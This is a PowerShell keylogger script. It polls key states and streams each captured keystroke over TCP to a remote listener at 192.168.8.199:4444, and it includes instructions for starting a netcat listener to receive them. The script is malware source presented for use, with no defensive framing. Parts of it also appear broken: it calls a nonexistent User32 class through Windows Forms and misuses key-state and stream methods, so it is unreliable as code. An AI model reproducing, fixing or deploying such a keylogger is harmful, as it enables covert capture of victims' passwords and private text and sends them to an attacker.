# Pure PowerShell Keylogger - No C# Compilation Crap
Add-Type -AssemblyName System.Windows.Forms

# Setup the listener
$targetIP = "192.168.8.199"
$targetPort = 4444
$client = $null
$stream = $null

Write-Host "Attempting to connect to $targetIP`:$targetPort..."
try {
    $client = New-Object System.Net.Sockets.TcpClient($targetIP, $targetPort)
    $stream = $client.GetStream()
    Write-Host "Connected. Logging keys." -ForegroundColor Green
    $stream.Write([System.Text.Encoding]::ASCII.GetBytes("=== Keylogger Started ===`r`n"))
} catch {
    Write-Host "FAILED TO CONNECT: $($_.Exception.Message)" -ForegroundColor Red
    Write-Host "Make sure netcat is listening: nc -lvp 4444" -ForegroundColor Yellow
    # Exit if we can't connect, no point in continuing
    return
}

# The actual keylogging loop
while ($true) {
    # Get all key states
    for ($i = 1; $i -le 254; $i++) {
        $state = [System.Windows.Forms.Control]::IsKeyLocked($i)
        $asyncState = [System.Windows.Forms.Control]::IsKeyLocked($i)
        
        # A more reliable way to check for key presses
        if ([System.Windows.Forms.Control]::ModifierKeys -ne $null) {
            # This is a bit of a hack, but it forces a check
        }

        # Check for actual key down events
        if ([System.Windows.Forms.User32]::GetAsyncKeyState($i) -ne 0) {
            $key = [System.Windows.Forms.Keys]::$i
            $keyName = $key.ToString()
            
            # Translate special keys
            switch ($keyName) {
                "Space" { $output = " " }
                "Return" { $output = "[ENTER]" }
                "Back" { $output = "[BACKSPACE]" }
                "Tab" { $output = "[TAB]" }
                "Capital" { $output = "[CAPSLOCK]" }
                "LShiftKey" { $output = "" } # Skip modifiers
                "RShiftKey" { $output = "" }
                "LControlKey" { $output = "" }
                "RControlKey" { $output = "" }
                "LMenu" { $output = "" }
                "RMenu" { $output = "" }
                default { 
                    # Check if it's a printable character
                    if ($keyName -match "^[A-Z0-9]$") {
                        $output = $keyName.ToLower()
                    } elseif ($keyName.StartsWith("D")) {
                        $output = $keyName.Substring(1)
                    } else {
                        $output = "" # Skip other weird keys
                    }
                }
            }

            if ($output -ne "") {
                Write-Host "Key: $output" -ForegroundColor Cyan
                try {
                    $byteData = [System.Text.Encoding]::ASCII.GetBytes($output)
                    $stream.Write($byteData, 0, $byteData.Length)
                    $stream.Flush()
                } catch {
                    Write-Host "Connection lost." -ForegroundColor Red
                    if ($client) { $client.Close() }
                    return
                }
            }
        }
    }
    Start-Sleep -Milliseconds 50 # Small delay to prevent spamming CPU
}
